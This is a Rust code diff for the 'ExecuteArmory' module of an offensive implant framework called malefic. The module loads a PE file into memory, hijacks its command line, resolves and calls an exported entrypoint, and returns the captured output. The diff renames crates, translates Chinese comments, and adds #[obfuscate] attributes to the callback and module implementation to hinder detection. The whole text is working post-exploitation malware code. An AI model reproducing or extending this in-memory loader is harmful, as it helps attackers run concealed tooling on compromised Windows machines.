@@ -5,17 +5,17 @@ use futures::StreamExt;
 use std::ptr::null_mut;
 use std::sync::{Arc, Mutex};
 
-use malefic_helper::common::utils::format_cmdline;
-use malefic_helper::win::kit::func::get_func_addr;
-use malefic_helper::win::kit::pe::{hijack_commandline, load_pe};
-use malefic_helper::win::kit::MaleficModule;
-use malefic_helper::win::types::DllMain;
-use malefic_proto::proto::modulepb::BinaryResponse;
 use crate::prelude::*;
+use malefic_common::utils::format_cmdline;
+use malefic_os_win::kit::apis::m_get_func_addr_with_module_base;
+use malefic_os_win::kit::pe::{hijack_commandline, load_pe};
+use malefic_os_win::kit::MaleficModule;
+use malefic_os_win::types::DllMain;
+use malefic_proto::proto::modulepb::BinaryResponse;
 
-lazy_static::lazy_static! {
+malefic_gateway::lazy_static! {
     static ref ARMORY_CHANNEL: Arc<Mutex<(UnboundedSender<String>, UnboundedReceiver<String>)>> = {
-        let (sender, receiver) = unbounded(); // 使用 futures 的 unbounded channel
+        let (sender, receiver) = unbounded(); // Use futures unbounded channel
         Arc::new(Mutex::new((sender, receiver)))
     };
 }
@@ -24,6 +24,7 @@ const SUCCESS: usize = 0;
 type ArmoryCallback = extern "C" fn(*const c_void, usize) -> usize;
 type ArmoryFunc = extern "C" fn(*const c_void, usize, ArmoryCallback) -> usize;
 
+#[obfuscate]
 pub extern "C" fn armory_callback(data: *const c_void, data_len: usize) -> usize {
     let channel = ARMORY_CHANNEL.clone();
     let final_data;
@@ -35,7 +36,7 @@ pub extern "C" fn armory_callback(data: *const c_void, data_len: usize) -> usize
     }
     block_on(async {
         if let Ok(channel) = channel.lock() {
-            let _ = channel.0.unbounded_send(final_data); // 使用 unbounded_send 替代 send
+            let _ = channel.0.unbounded_send(final_data); // Use unbounded_send instead of send
         }
     });
     SUCCESS
@@ -48,14 +49,14 @@ pub struct ExecuteArmory {}
 impl Module for ExecuteArmory {}
 
 #[async_trait]
-impl malefic_proto::module::ModuleImpl for ExecuteArmory {
-
+#[obfuscate]
+impl malefic_module::ModuleImpl for ExecuteArmory {
     #[allow(unused_variables)]
     async fn run(
         &mut self,
         id: u32,
-        receiver: &mut malefic_proto::module::Input,
-        sender: &mut malefic_proto::module::Output,
+        receiver: &mut malefic_module::Input,
+        sender: &mut malefic_module::Output,
     ) -> ModuleResult {
         let request = check_request!(receiver, Body::ExecuteBinary)?;
         let name = request.name + "\x00";
@@ -74,7 +75,8 @@ impl malefic_proto::module::ModuleImpl for ExecuteArmory {
                 return to_error!(Err("Armory load failed, Failed to load PE file".to_string()));
             }
             hijack_commandline(&par);
-            let armory_entrypoint = get_func_addr((*armory).new_module as _, entrypoint);
+            let armory_entrypoint =
+                m_get_func_addr_with_module_base((*armory).new_module as _, entrypoint.as_bytes());
             if armory_entrypoint.is_null() {
                 return to_error!(Err("Failed to get entrypoint function address".to_string()));
             }
@@ -97,7 +99,7 @@ impl malefic_proto::module::ModuleImpl for ExecuteArmory {
                         ret = data.as_bytes().to_vec();
                     }
                 }
-                malefic_helper::win::kit::pe::unload_pe(armory as _);
+                malefic_os_win::kit::pe::unload_pe(armory as _);
             });
         }
 
@@ -111,5 +113,4 @@ impl malefic_proto::module::ModuleImpl for ExecuteArmory {
             }),
         ))
     }
-
 }
